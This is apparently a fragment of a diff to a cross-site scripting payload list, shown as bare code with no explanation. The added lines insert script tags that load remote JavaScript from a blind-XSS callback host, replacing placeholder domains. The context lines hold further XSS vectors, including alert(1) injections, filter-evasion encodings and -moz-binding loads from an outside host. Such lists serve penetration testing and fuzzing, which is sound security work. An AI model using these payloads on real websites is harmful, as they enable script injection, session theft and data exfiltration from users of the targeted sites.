+<script a=">" '' SRC="https://blindprofessor.bxss.in"></script>
+<script a=">" SRC="https://blindprofessor.bxss.in"></script>
+<script a=">" SRC="https://blindprofessor.bxss.in"></script>
+<script a=">" SRC="https://blindprofessor.bxss.in"></script>
+<script a=">" SRC="https://blindprofessor.bxss.in"></script>
+<script a=">'>" SRC="https://blindprofessor.bxss.in"></script>
+<script a=">'>" SRC="https://blindprofessor.bxss.in"></script>
+<script a=">'>" SRC="https://blindprofessor.bxss.in"></script>
+<script a=">'>" SRC="https://blindprofessor.bxss.in"></script>
+<script a=`>` SRC="https://blindprofessor.bxss.in"></script>
+<script a=`>` SRC="https://blindprofessor.bxss.in"></script>
+<script a=`>` SRC="https://blindprofessor.bxss.in"></script>
+<script a=`>` SRC="https://blindprofessor.bxss.in"></script>
 <script charset="\x22>javascript:alert(1)</script>
 <script charset="\x22>javascript:alert(1)</script>
 <script charset="\x22>javascript:alert(1)</script>
@@ -15572,8 +15567,8 @@ ${alert(1)}
 <script src="\\%(jscript)s"></script>
 <script src="\\%(jscript)s"></script>
 <script src="\\%(jscript)s"></script>
-<script src="\\example.com\foo.js"></script> // Safari 5.0//["'`-->]]>]</div>
-<script src="\\example.com\foo.js"></script> // Safari 5.0//["'`-->]]>]</div>
+<script src="\\https://blindprofessor.bxss.in"></script> // Safari 5.0//["'`-->]]>]</div>
+<script src="\\https://blindprofessor.bxss.in"></script> // Safari 5.0//["'`-->]]>]</div>
 <script src="data:&comma;alert(1)//
 <script src="data:&comma;alert(1)//
 <script src="data:\xCB\x8F,javascript:alert(1)"></script>
@@ -21485,8 +21480,8 @@ setTimeout//
 setTimeout//
 setTimeout`alert\x28document.domain\x29`
 setTimeout`alert\x28document.domain\x29`
-src="http://www.site.com/XSS.js"></script>
-src="http://www.site.com/XSS.js"></script>
+src="https://blindprofessor.bxss.in"></script>
+src="https://blindprofessor.bxss.in"></script>
  sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
  sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
  style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="
